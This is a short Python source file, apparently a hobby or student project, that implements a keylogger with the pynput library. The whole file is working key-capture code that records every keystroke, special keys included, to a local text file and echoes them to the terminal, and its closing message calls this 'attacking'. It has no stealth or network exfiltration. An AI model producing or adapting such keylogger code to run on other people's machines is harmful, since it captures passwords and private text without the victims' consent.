# Name: keylogger.py
# Author: dipper
# Date: 2.6.2026
# Description:  a key logger
# imports


import os
import pynput
from pynput.keyboard import Listener
from pynput import keyboard
#CONSTANTS
#hey linor please change this path so it'll work

PATH = "keylogger_file.txt"

# this function a records to a file every 
# keyboard press recorded by the user
def on_press(key):
    with open(PATH, "a") as file:
        try:
            file.write(f"{key.char}")
            print(f"{key.char}")

        except AttributeError:
            if key == key.space:
                file.write("[SPACE]")
                print("[SPACE] ")

            elif key == key.enter:
                file.write("\n")
                print("\n")

            else:
                file.write(f"[{key}]")
                print(f"[{key}]")
        

# this func listens to keyboard pressing and with the "on_press" func prints it 
# out to a file called "keylog.txt" in the current path
def keylogging_func():

    # create output file if not existing
    print("outputs out to file named\n'keylogger_file.txt'" \
            "notice that if u write in the terminal you'll have to delete what u " \
            "wrote before preciding" \
            "beware not to press enter in the comand line" \
            "to exit press cntrl+c")
    file_path ="keylogger_file.txt"

    listener = keyboard.Listener(on_press=on_press)
    try:
        listener.start()
        listener.join()
    except KeyboardInterrupt:
        print("ctrl+c pressed")
        listener.stop()
        return None

        

def main():
    keylogging_func()
    input("been nice attackingwith u \nbye")


if __name__=="__main__":
    main()